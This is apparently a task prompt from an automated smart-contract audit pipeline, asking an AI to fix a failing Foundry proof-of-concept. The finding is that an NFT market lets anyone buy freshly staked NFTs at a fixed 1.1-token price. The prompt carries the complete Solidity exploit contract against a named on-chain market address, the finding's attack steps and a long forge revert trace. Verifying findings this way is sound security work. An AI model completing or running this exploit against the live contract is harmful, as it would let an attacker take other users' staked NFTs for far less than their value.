You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Any user can buy staked NFTs out of the shared pool at a fixed 1.1-token price
- claim: `stakeNFTs()` transfers token IDs into the market contract, but the contract never records who deposited which NFT or marks them as non-sale inventory. `targetedPurchase()` later lets any caller specify arbitrary token IDs and pulls those IDs out of the contract for a flat `1.1 ether` each via `_targetedPurchase()`. That means freshly staked NFTs become immediately purchasable by anyone, regardless of the original owner’s intent.
- impact: A buyer can monitor for rare or valuable NFTs being staked and immediately extract them from the pool for the floor price, capturing the full rarity premium and leaving the original staker with only a fungible claim.
- exploit_paths: ["Victim calls `stakeNFTs([rareTokenId])` and transfers the NFT into the market contract.", "Attacker calls `targetedPurchase([rareTokenId])` and acquires that specific NFT for `1.1 ether` worth of Rugged.", "Victim can no longer recover the original NFT and is left with only the protocol\u2019s fungible accounting claim."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IMarketLike {
    function ruggedToken() external view returns (address);
    function stakeNFTs(uint256[] calldata tokenIds) external;
    function targetedPurchase(uint256[] calldata tokenIds) external;
    function stakers(
        address account
    ) external view returns (uint256 amountStaked, uint256 rewardDebt);
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC404Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function approve(address spender, uint256 valueOrTokenId) external returns (bool);
    function transferFrom(address from, address to, uint256 valueOrTokenId) external;
}

interface IUniswapV2Router02Like {
    function WETH() external pure returns (address);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract VictimStaker {
    address public immutable MARKET;
    address public immutable RUGGED;
    address public immutable CONTROLLER;

    constructor(address market_, address rugged_, address controller_) {
        MARKET = market_;
        RUGGED = rugged_;
        CONTROLLER = controller_;
    }

    function stakeSingle(uint256 tokenId) external {
        require(msg.sender == CONTROLLER, "ONLY_CONTROLLER");

        IERC404Like(RUGGED).approve(MARKET, tokenId);

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        IMarketLike(MARKET).stakeNFTs(tokenIds);
    }
}

contract FlawVerifier {
    address public constant MARKET = 0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6;
    address public constant UNISWAP_V2_ROUTER =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 public constant PRICE_PER_NFT = 1.1 ether;
    uint256 public constant STAKE_CREDIT_PER_NFT = 1 ether;
    uint256 public constant MAX_TOKEN_ID = 10_000;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public hypothesisValidated;
    bool public victimStakeObserved;

    bool public path0_victimStakesNamedNFTIntoSharedPool;
    bool public path1_attackerBuysThatSpecificStakedNFTForFixedPrice;
    bool public path2_victimLeftOnlyWithFungibleAccountingClaim;

    address public victim;
    uint256 public victimTokenId;
    uint256 public acquiredTokenId;
    uint256 public victimAccountingClaim;
    uint256 public ruggedSpent;
    uint256 public ruggedBalanceBefore;
    uint256 public ruggedBalanceAfter;
    bytes32 public lastStatus;

    event AttemptStatus(bytes32 status, uint256 tokenId, uint256 ruggedBalance);

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (hypothesisValidated) {
            return;
        }

        address rugged = IMarketLike(MARKET).ruggedToken();
        _profitToken = rugged;

        // direct_or_existing_balance_first:
        // first use verifier-held Rugged or verifier-held ETH routed through a live public pool.
        // No arbitrary funding or storage mutation is introduced.
        _maybeAcquireRuggedFromHeldETH(rugged);

        // Exploit path 0:
        // a victim stakes a specific NFT into the market with `stakeNFTs([rareTokenId])`,
        // which transfers that exact token ID into shared market custody without reserving it.
        uint256 tokenId = _stageVictimStake(rugged);
        if (tokenId == 0) {
            lastStatus = keccak256("NO_VICTIM_STAKE_PATH_AVAILABLE");
            emit AttemptStatus(lastStatus, 0, _ruggedBalance(rugged));
            return;
        }

        path0_victimStakesNamedNFTIntoSharedPool = true;
        victimStakeObserved = true;
        victimTokenId = tokenId;
        victimAccountingClaim = _victimClaim(victim);

        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
            lastStatus = keccak256("STAKE_DID_NOT_CREATE_FUNGIBLE_CLAIM");
            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
            return;
        }

        _maybeAcquireRuggedFromHeldETH(rugged);

        ruggedBalanceBefore = _ruggedBalance(rugged);
        if (ruggedBalanceBefore < PRICE_PER_NFT) {
            lastStatus = keccak256("INSUFFICIENT_FUNDS_FOR_TARGETED_PURCHASE");
            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
            return;
        }

        if (!_approveFungible(rugged, MARKET, ruggedBalanceBefore)) {
            lastStatus = keccak256("APPROVE_FAILED");
            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceBefore);
            return;
        }

        // Exploit path 1:
        // the attacker names the freshly staked token ID in `targetedPurchase([rareTokenId])`
        // and acquires that exact NFT for the fixed 1.1 Rugged purchase price.
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        IMarketLike(MARKET).targetedPurchase(tokenIds);

        if (_ownerOf(rugged, tokenId) != address(this)) {
            lastStatus = keccak256("PURCHASE_DID_NOT_TRANSFER_TARGET");
            emit AttemptStatus(lastStatus, tokenId, _ruggedBalance(rugged));
            return;
        }

        path1_attackerBuysThatSpecificStakedNFTForFixedPrice = true;
        acquiredTokenId = tokenId;
        ruggedBalanceAfter = _ruggedBalance(rugged);
        ruggedSpent = ruggedBalanceBefore > ruggedBalanceAfter
            ? ruggedBalanceBefore - ruggedBalanceAfter
            : 0;

        // Exploit path 2:
        // the victim no longer controls the original NFT and is left only with the market's
        // fungible staking claim instead of recoverable ownership of that rare token ID.
        victimAccountingClaim = _victimClaim(victim);
        if (victimAccountingClaim < STAKE_CREDIT_PER_NFT) {
            lastStatus = keccak256("VICTIM_CLAIM_MISSING_AFTER_THEFT");
            emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
            return;
        }

        path2_victimLeftOnlyWithFungibleAccountingClaim = true;
        hypothesisValidated = true;

        // This PoC proves wrongful extraction of an existing on-chain Rugged NFT. It does not
        // force an additional sale, so fungible realized profit remains zero even though the
        // attacker has captured the NFT's rarity premium in-kind.
        _profitAmount = 0;

        lastStatus = keccak256("HYPOTHESIS_VALIDATED_NFT_STOLEN");
        emit AttemptStatus(lastStatus, tokenId, ruggedBalanceAfter);
    }

    function profitToken() external view returns (address) {
        if (_profitToken != address(0)) {
            return _profitToken;
        }
        return IMarketLike(MARKET).ruggedToken();
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _stageVictimStake(address rugged) internal returns (uint256) {
        uint256 tokenId = _findOwnedToken(rugged, address(this));

        // If the verifier does not already hold a Rugged NFT, source one through the live market
        // first. This is only a realistic bootstrap step to obtain a victim-side NFT; the finding's
        // core causality remains that the victim's stake becomes public sale inventory afterward.
        if (tokenId == 0) {
            tokenId = _bootstrapVictimNft(rugged);
        }

        if (tokenId == 0) {
            return 0;
        }

        VictimStaker victimContract = new VictimStaker(MARKET, rugged, address(this));
        victim = address(victimContract);

        IERC404Like(rugged).transferFrom(address(this), victim, tokenId);
        victimContract.stakeSingle(tokenId);

        if (_ownerOf(rugged, tokenId) != MARKET) {
            return 0;
        }

        return tokenId;
    }

    function _bootstrapVictimNft(address rugged) internal returns (uint256) {
        uint256 tokenId = _findOwnedToken(rugged, MARKET);
        if (tokenId == 0) {
            return 0;
        }

        uint256 ruggedBalance = _ruggedBalance(rugged);
        if (ruggedBalance < PRICE_PER_NFT) {
            return 0;
        }

        if (!_approveFungible(rugged, MARKET, ruggedBalance)) {
            return 0;
        }

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        IMarketLike(MARKET).targetedPurchase(tokenIds);

        if (_ownerOf(rugged, tokenId) != address(this)) {
            return 0;
        }

        return tokenId;
    }

    function _victimClaim(address account) internal view returns (uint256 amountStaked) {
        if (account == address(0)) {
            return 0;
        }

        (bool ok, bytes memory data) = MARKET.staticcall(
            abi.encodeWithSelector(IMarketLike.stakers.selector, account)
        );
        if (!ok || data.length < 64) {
            return 0;
        }

        (amountStaked, ) = abi.decode(data, (uint256, uint256));
    }

    function _findOwnedToken(address rugged, address owner) internal view returns (uint256) {
        for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
            if (_ownerOf(rugged, tokenId) == owner) {
                return tokenId;
            }
        }
        return 0;
    }

    function _ownerOf(address rugged, uint256 tokenId) internal view returns (address owner) {
        (bool ok, bytes memory data) =
            rugged.staticcall(abi.encodeWithSelector(IERC404Like.ownerOf.selector, tokenId));
        if (!ok || data.length < 32) {
            return address(0);
        }
        owner = abi.decode(data, (address));
    }

    function _ruggedBalance(address rugged) internal view returns (uint256) {
        return IERC20Like(rugged).balanceOf(address(this));
    }

    function _approveFungible(
        address token,
        address spender,
        uint256 amount
    ) internal returns (bool) {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
        if (address(this).balance == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = IUniswapV2Router02Like(UNISWAP_V2_ROUTER).WETH();
        path[1] = rugged;

        try IUniswapV2Router02Like(UNISWAP_V2_ROUTER)
            .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
            0, path, address(this), block.timestamp
        ) {} catch {
            // If no usable live V2 pool exists at this fork block, continue with only the
            // verifier's existing Rugged holdings. The PoC does not fabricate capital off-path.
        }
    }
}

```

forge stdout (tail):
```
953) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9954) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9955) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9956) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9957) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9958) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9959) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9960) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9961) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9962) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9963) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9964) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9965) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9966) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9967) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9968) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9969) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9970) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9971) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9972) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9973) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9974) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9975) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9976) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9977) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9978) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9979) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9980) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9981) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9982) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9983) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9984) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9985) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9986) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9987) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9988) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9989) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9990) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9991) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9992) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9993) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9994) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9995) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9996) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9997) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9998) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(9999) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::ownerOf(10000 [1e4]) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] 0x0000000000000000000000000000000000000000::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Stop]
    │   └─ ← [Revert] call to non-contract address 0x0000000000000000000000000000000000000000
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 11.70s (162.48ms CPU time)

Ran 1 test suite in 11.78s (11.70s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 18236167)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
